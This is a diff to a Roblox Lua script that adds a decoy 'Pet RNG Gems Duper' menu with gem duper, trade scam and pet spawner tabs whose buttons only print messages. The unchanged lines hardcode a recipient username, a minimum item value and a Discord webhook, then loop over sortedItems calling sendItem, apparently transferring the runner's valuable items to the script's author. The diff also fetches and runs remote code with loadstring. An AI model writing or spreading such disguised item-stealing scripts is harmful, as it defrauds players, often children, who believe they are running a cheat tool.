@@ -1,3 +1,6 @@
+-- Load Orion Library
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
 Username = "bx4rzwasdeleted"
 min_rap = 60000 -- minimum rap of each item you want to get sent to you. 10k by default
 webhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3"
@@ -213,3 +216,153 @@ if #sortedItems > 0 then
         sendItem(item.category, item.uid, item.amount)
     end
 end
+
+
+ScreenGui = {
+        IgnoreGuiInset = false, -- Consider the top bar on mobile devices
+        SizeConstraint = "RelativeXY" -- Makes the UI scale properly on mobile devices
+    },
+
+-- Create the window
+local Window = OrionLib:MakeWindow({
+    Name = ":feet: PET RNG GEMS DUPER :gem:",
+    HidePremium = false,
+    SaveConfig = true,
+    ConfigFolder = "PetRNGGemsDuper",
+    IntroEnabled = true,
+    IntroText = "Welcome to the Pet RNG Gems Duper!",
+    IntroIcon = "rbxassetid://4483345998", -- You can change this to any desired icon
+})
+
+-- Create the tab for the "GEMS GENERATOR"
+local GemsTab = Window:MakeTab({
+    Name = ":gem: GEMS GENERATOR",
+    Icon = "rbxassetid://4483345998", -- Use a unique icon for Gems
+    PremiumOnly = false
+})
+
+-- Add a toggle for "Enable Gem Duper"
+GemsTab:AddToggle({
+    Name = ":arrows_counterclockwise: Enable Gem Duper",
+    Default = false,
+    Callback = function(Value)
+        print("Gem Duper toggled:", Value)
+    end    
+})
+
+-- Add a textbox for "Amount of Gems"
+GemsTab:AddTextbox({
+    Name = ":coin: Amount Of Gems",
+    Default = "",
+    TextDisappear = false,
+    Placeholder = "Insert Amount of Gems",
+    Callback = function(Value)
+        print("Amount of Gems input:", Value)
+    end    
+})
+
+-- Add a button for "Start Duper"
+GemsTab:AddButton({
+    Name = ":rocket: Start Duper",
+    Callback = function()
+        print("Duper started")
+    end    
+})
+
+-- Create the tab for "TRADE SCAM"
+local TradeTab = Window:MakeTab({
+    Name = ":rotating_light: TRADE SCAM",
+    Icon = "rbxassetid://4483345998", -- Use a unique icon for Trade Scam
+    PremiumOnly = false
+})
+
+-- Add a toggle for "Enable Trade Lock"
+TradeTab:AddToggle({
+    Name = ":lock: Enable Trade Lock",
+    Default = false,
+    Callback = function(Value)
+        print("Trade Lock toggled:", Value)
+    end    
+})
+
+-- Add a textbox for "Player Username"
+TradeTab:AddTextbox({
+    Name = ":bust_in_silhouette: Player Username",
+    Default = "",
+    TextDisappear = false,
+    Placeholder = "Insert Victim's Username",
+    Callback = function(Value)
+        print("Victim Username:", Value)
+    end    
+})
+
+-- Add a button for "Freeze Trade"
+TradeTab:AddButton({
+    Name = ":snowflake: Freeze Trade",
+    Callback = function()
+        print("Trade frozen")
+    end    
+})
+
+-- Create the tab for "FAST ROLL"
+local FastRollTab = Window:MakeTab({
+    Name = ":zap: FAST ROLL",
+    Icon = "rbxassetid://4483345998", -- Use a unique icon for Fast Roll
+    PremiumOnly = false
+})
+
+-- Add a button for "Start Fast Roll"
+FastRollTab:AddButton({
+    Name = ":game_die: Start Fast Roll",
+    Callback = function()
+        print("Fast roll started!")
+    end    
+})
+
+-- Create the tab for "PET SPAWNER"
+local PetSpawnerTab = Window:MakeTab({
+    Name = ":feet: PET SPAWNER",
+    Icon = "rbxassetid://4483345998", -- Use a unique icon for Pet Spawner
+    PremiumOnly = false
+})
+
+-- Add a search box for "Search for Pets"
+PetSpawnerTab:AddTextbox({
+    Name = ":mag: Search for Pets",
+    Default = "",
+    TextDisappear = false,
+    Placeholder = "Type Pet Name to Search",
+    Callback = function(Value)
+        print("Searching for pet:", Value)
+    end    
+})
+
+-- Add a textbox for "Pet Name"
+PetSpawnerTab:AddTextbox({
+    Name = ":dog: Pet Name",
+    Default = "",
+    TextDisappear = false,
+    Placeholder = "Insert Pet Name",
+    Callback = function(Value)
+        print("Pet Name input:", Value)
+    end    
+})
+
+-- Add a button for "Spawn Pet"
+PetSpawnerTab:AddButton({
+    Name = ":dog2: Spawn Pet",
+    Callback = function()
+        print("Pet spawned!")
+    end    
+})
+
+-- Create a notification for user actions
+OrionLib:MakeNotification({
+    Name = ":tada: Welcome!",
+    Content = "Use the tabs to manage gems, trade scams, fast rolls, and spawn pets!",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+-- Finalize and initialize the Orion UI
+OrionLib:Init()
